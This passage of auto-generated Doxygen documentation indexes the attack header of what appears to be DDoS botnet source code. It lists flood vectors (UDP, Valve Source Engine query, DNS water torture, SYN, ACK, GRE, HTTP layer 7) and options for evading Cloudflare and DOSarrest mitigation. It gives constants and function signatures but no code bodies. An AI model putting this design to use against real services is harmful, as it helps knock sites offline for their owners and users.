<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, and <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>.</p>

</div>
</div>
<a class="anchor" id="a4d0115976f56267c42e6a09ff3651c02"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_SPORT&#160;&#160;&#160;6</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00052">52</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__gre_8c_source.html#l00162">attack_gre_eth()</a>, <a class="el" href="attack__gre_8c_source.html#l00020">attack_gre_ip()</a>, <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>, <a class="el" href="attack__udp_8c_source.html#l00230">attack_udp_dns()</a>, <a class="el" href="attack__udp_8c_source.html#l00025">attack_udp_generic()</a>, <a class="el" href="attack__udp_8c_source.html#l00375">attack_udp_plain()</a>, and <a class="el" href="attack__udp_8c_source.html#l00129">attack_udp_vse()</a>.</p>

</div>
</div>
<a class="anchor" id="a4f086d53d4494633a898fbd9886b08bf"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_SYN&#160;&#160;&#160;15</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00061">61</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a5a6f282c43f088516dce2de1b69ae7d8"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_OPT_URG&#160;&#160;&#160;11</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00057">57</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__tcp_8c_source.html#l00161">attack_tcp_ack()</a>, <a class="el" href="attack__tcp_8c_source.html#l00293">attack_tcp_stomp()</a>, and <a class="el" href="attack__tcp_8c_source.html#l00018">attack_tcp_syn()</a>.</p>

</div>
</div>
<a class="anchor" id="a5d6a088c0ce3645498a4870ccfd09a3c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_ACK&#160;&#160;&#160;4  /* ACK <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00038">38</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="acfffd96bfc135495f6d2dcf0b5c0345c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_DNS&#160;&#160;&#160;2  /* DNS water torture */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00036">36</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="af036d9269a58359f703ac0b2cece2187"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_GREETH&#160;&#160;&#160;7  /* GRE Ethernet <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00041">41</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="a3ac5365a0319b66a7a029342542156b6"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_GREIP&#160;&#160;&#160;6  /* GRE IP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00040">40</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="a8ced07abb18975692f26b538247550db"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_HTTP&#160;&#160;&#160;10 /* HTTP layer 7 <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00044">44</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="ad64add15bdc08f30c42b74a7af54c68b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_STOMP&#160;&#160;&#160;5  /* ACK <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> <a class="el" href="ForumPost_8txt.html#ab7900d660b247d4335d4709117e51a0b">to</a> bypass mitigation devices */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00039">39</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="ad80bc552383b0999af6fa38e1718419c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_SYN&#160;&#160;&#160;3  /* SYN <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> with options */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00037">37</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="ae0f309784c914a61d84fd3988e3e7321"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_UDP&#160;&#160;&#160;0  /* Straight up UDP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00034">34</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="a4f522d5241fa0355196c03eaa610c90f"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_UDP_PLAIN&#160;&#160;&#160;9  /* Plain UDP <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> optimized for speed */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00043">43</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="afa9c71242ff3032ca0a9b4f8053a9769"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATK_VEC_VSE&#160;&#160;&#160;1  /* Valve Source Engine query <a class="el" href="single__load_8c.html#a412161fb153a2b9a2b6b287baa1b0971">flood</a> */</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00035">35</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>

</div>
</div>
<a class="anchor" id="a7c4eacf15bd06764a0834171b5d6789f"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define ATTACK_CONCURRENT_MAX&#160;&#160;&#160;8</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00012">12</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00044">attack_kill_all()</a>.</p>

</div>
</div>
<a class="anchor" id="afb5c550090ed0a9640f362e9897ee7cd"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_CLOSED&#160;&#160;&#160;11</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00095">95</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a17d0f5a78e9f64122185611485c18222"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_CONNECTING&#160;&#160;&#160;2</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00086">86</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a9a740956951891d2c55d87641e7211c0"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_HTTPS_STUFF&#160;&#160;&#160;3</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00087">87</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

</div>
</div>
<a class="anchor" id="a61e0fc173a48e31ab11b5d4e54d751bd"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_INIT&#160;&#160;&#160;0</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00084">84</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a91cd4ed6175b666edf34c1a23bbbe368"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_QUEUE_RESTART&#160;&#160;&#160;10</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00094">94</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a9fe6114dced0ca47726f7afd1b3890f1"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_RECV_BODY&#160;&#160;&#160;7</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00091">91</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="abedf69cb8cdb85bfc7f307503fd62775"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_RECV_HEADER&#160;&#160;&#160;6</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00090">90</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="acb5cf7d3ab57770048fc89abd9f386e8"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_RESTART&#160;&#160;&#160;1</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00085">85</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="aff008d93b76d40a67da697001e176f6b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_SEND&#160;&#160;&#160;4</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00088">88</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="ab97fc0c5b4c059fb0c3fd2161a1fefa0"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_SEND_HEADERS&#160;&#160;&#160;5</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00089">89</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>.</p>

</div>
</div>
<a class="anchor" id="a2646e2fce686ccd10e0b9a511744f29c"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_SEND_JUNK&#160;&#160;&#160;8</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00092">92</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>.</p>

</div>
</div>
<a class="anchor" id="ae9f5ad7a6d1b61d1f65942d9c0c0205b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONN_SNDBUF_WAIT&#160;&#160;&#160;9</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00093">93</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>.</p>

</div>
</div>
<a class="anchor" id="aaed58b5e52e808b4237035050183f315"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_CONNECTION_MAX&#160;&#160;&#160;256</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00017">17</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a843d2259e52b51843a2abe0bfb764dc4"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_COOKIE_LEN_MAX&#160;&#160;&#160;128</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00102">102</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a7afb6e2da31b70aad81a3a8c4cce03ac"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_COOKIE_MAX&#160;&#160;&#160;5</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00101">101</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="af13bc0acf7afcddfcc5098dbe5c343aa"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_DOMAIN_MAX&#160;&#160;&#160;128</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00100">100</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00855">attack_app_cfnull()</a>, and <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a8491fa980eede52fb92fb6dd2a46a913"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_HACK_DRAIN&#160;&#160;&#160;64</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00098">98</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="a0b7ec3c5170952fe1071a9326cd51264"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_PATH_MAX&#160;&#160;&#160;256</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00099">99</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="af6a49c502e37f3f5dfc390f758dedc38"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_POST_MAX&#160;&#160;&#160;512</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00103">103</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

</div>
</div>
<a class="anchor" id="a358ec495035a144be684ef619051366b"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_PROT_CLOUDFLARE&#160;&#160;&#160;2</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00106">106</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="af9036def147b9e5de7a7b981f1d6212e"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_PROT_DOSARREST&#160;&#160;&#160;1</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00105">105</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<a class="anchor" id="ac6eda2a3273daf4a93162bb51f969093"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">#define HTTP_RDBUF_SIZE&#160;&#160;&#160;1024</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00097">97</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

<p>Referenced by <a class="el" href="attack__app_8c_source.html#l00026">attack_app_http()</a>.</p>

</div>
</div>
<h2 class="groupheader">Typedef Documentation</h2>
<a class="anchor" id="a5eb6c3d025947541be2af2b80b9b655a"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef void(* ATTACK_FUNC) (uint8_t, struct <a class="el" href="structattack__target.html">attack_target</a> *, uint8_t, struct <a class="el" href="structattack__option.html">attack_option</a> *)</td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00031">31</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

</div>
</div>
<a class="anchor" id="a0fb3d519486301242753dc8e7f175683"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">typedef uint8_t <a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8h_source.html#l00032">32</a> of file <a class="el" href="attack_8h_source.html">attack.h</a>.</p>

</div>
</div>
<h2 class="groupheader">Function Documentation</h2>
<a class="anchor" id="aff031d9300a6664f36089b134a04e8e6"></a>
<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static void add_attack </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a5eb6c3d025947541be2af2b80b9b655a">ATTACK_FUNC</a>&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

</div>
</div>
<a class="anchor" id="a4b75221461ff0dc40c8199b5c2353a81"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_app_http </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__app_8c_source.html#l00026">26</a> of file <a class="el" href="attack__app_8c_source.html">attack_app.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00070">ATK_OPT_CONNS</a>, <a class="el" href="attack_8h_source.html#l00054">ATK_OPT_DOMAIN</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00066">ATK_OPT_METHOD</a>, <a class="el" href="attack_8h_source.html#l00068">ATK_OPT_PATH</a>, <a class="el" href="attack_8h_source.html#l00067">ATK_OPT_POST_DATA</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00193">attack_get_opt_str()</a>, <a class="el" href="attack_8h_source.html#l00124">attack_http_state::chunked</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="ForumPost_8txt_source.html#l00001">connect</a>, <a class="el" href="attack_8h_source.html#l00125">attack_http_state::content_length</a>, <a class="el" href="attack_8h_source.html#l00128">attack_http_state::cookies</a>, <a class="el" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain()</a>, <a class="el" href="attack_8h_source.html#l00116">attack_http_state::domain</a>, <a class="el" href="attack_8h_source.html#l00113">attack_http_state::dst_addr</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="attack_8h_source.html#l00109">attack_http_state::fd</a>, <a class="el" href="attack_8h_source.html#l00095">HTTP_CONN_CLOSED</a>, <a class="el" href="attack_8h_source.html#l00086">HTTP_CONN_CONNECTING</a>, <a class="el" href="attack_8h_source.html#l00084">HTTP_CONN_INIT</a>, <a class="el" href="attack_8h_source.html#l00094">HTTP_CONN_QUEUE_RESTART</a>, <a class="el" href="attack_8h_source.html#l00091">HTTP_CONN_RECV_BODY</a>, <a class="el" href="attack_8h_source.html#l00090">HTTP_CONN_RECV_HEADER</a>, <a class="el" href="attack_8h_source.html#l00085">HTTP_CONN_RESTART</a>, <a class="el" href="attack_8h_source.html#l00088">HTTP_CONN_SEND</a>, <a class="el" href="attack_8h_source.html#l00017">HTTP_CONNECTION_MAX</a>, <a class="el" href="attack_8h_source.html#l00102">HTTP_COOKIE_LEN_MAX</a>, <a class="el" href="attack_8h_source.html#l00101">HTTP_COOKIE_MAX</a>, <a class="el" href="attack_8h_source.html#l00100">HTTP_DOMAIN_MAX</a>, <a class="el" href="attack_8h_source.html#l00098">HTTP_HACK_DRAIN</a>, <a class="el" href="attack_8h_source.html#l00099">HTTP_PATH_MAX</a>, <a class="el" href="attack_8h_source.html#l00106">HTTP_PROT_CLOUDFLARE</a>, <a class="el" href="attack_8h_source.html#l00105">HTTP_PROT_DOSARREST</a>, <a class="el" href="attack_8h_source.html#l00097">HTTP_RDBUF_SIZE</a>, <a class="el" href="attack_8h_source.html#l00123">attack_http_state::keepalive</a>, <a class="el" href="attack_8h_source.html#l00111">attack_http_state::last_recv</a>, <a class="el" href="attack_8h_source.html#l00112">attack_http_state::last_send</a>, <a class="el" href="attack_8h_source.html#l00118">attack_http_state::method</a>, <a class="el" href="attack_8h_source.html#l00127">attack_http_state::num_cookies</a>, <a class="el" href="attack_8h_source.html#l00119">attack_http_state::orig_method</a>, <a class="el" href="attack_8h_source.html#l00115">attack_http_state::path</a>, <a class="el" href="attack_8h_source.html#l00117">attack_http_state::postdata</a>, <a class="el" href="attack_8h_source.html#l00121">attack_http_state::protection_type</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="attack_8h_source.html#l00131">attack_http_state::rdbuf</a>, <a class="el" href="attack_8h_source.html#l00130">attack_http_state::rdbuf_pos</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="attack_8h_source.html#l00110">attack_http_state::state</a>, <a class="el" href="table_8h_source.html#l00054">TABLE_ATK_ACCEPT</a>, <a class="el" href="table_8h_source.html#l00055">TABLE_ATK_ACCEPT_LNG</a>, <a class="el" href="table_8h_source.html#l00063">TABLE_ATK_CHUNKED</a>, <a class="el" href="table_8h_source.html#l00067">TABLE_ATK_CLOUDFLARE_NGINX</a>, <a class="el" href="table_8h_source.html#l00065">TABLE_ATK_CONNECTION_HDR</a>, <a class="el" href="table_8h_source.html#l00061">TABLE_ATK_CONTENT_LENGTH_HDR</a>, <a class="el" href="table_8h_source.html#l00056">TABLE_ATK_CONTENT_TYPE</a>, <a class="el" href="table_8h_source.html#l00066">TABLE_ATK_DOSARREST</a>, <a class="el" href="table_8h_source.html#l00053">TABLE_ATK_KEEP_ALIVE</a>, <a class="el" href="table_8h_source.html#l00064">TABLE_ATK_KEEP_ALIVE_HDR</a>, <a class="el" href="table_8h_source.html#l00059">TABLE_ATK_LOCATION_HDR</a>, <a class="el" href="table_8h_source.html#l00058">TABLE_ATK_REFRESH_HDR</a>, <a class="el" href="table_8h_source.html#l00057">TABLE_ATK_SET_COOKIE</a>, <a class="el" href="table_8h_source.html#l00060">TABLE_ATK_SET_COOKIE_HDR</a>, <a class="el" href="table_8h_source.html#l00062">TABLE_ATK_TRANSFER_ENCODING_HDR</a>, <a class="el" href="table_8h_source.html#l00074">TABLE_HTTP_FIVE</a>, <a class="el" href="table_8h_source.html#l00073">TABLE_HTTP_FOUR</a>, <a class="el" href="table_8h_source.html#l00070">TABLE_HTTP_ONE</a>, <a class="el" href="table_8h_source.html#l00072">TABLE_HTTP_THREE</a>, <a class="el" href="table_8h_source.html#l00071">TABLE_HTTP_TWO</a>, <a class="el" href="table_8c_source.html#l00093">table_lock_val()</a>, <a class="el" href="table_8c_source.html#l00108">table_retrieve_val()</a>, <a class="el" href="table_8c_source.html#l00078">table_unlock_val()</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>, <a class="el" href="attack_8h_source.html#l00114">attack_http_state::user_agent</a>, <a class="el" 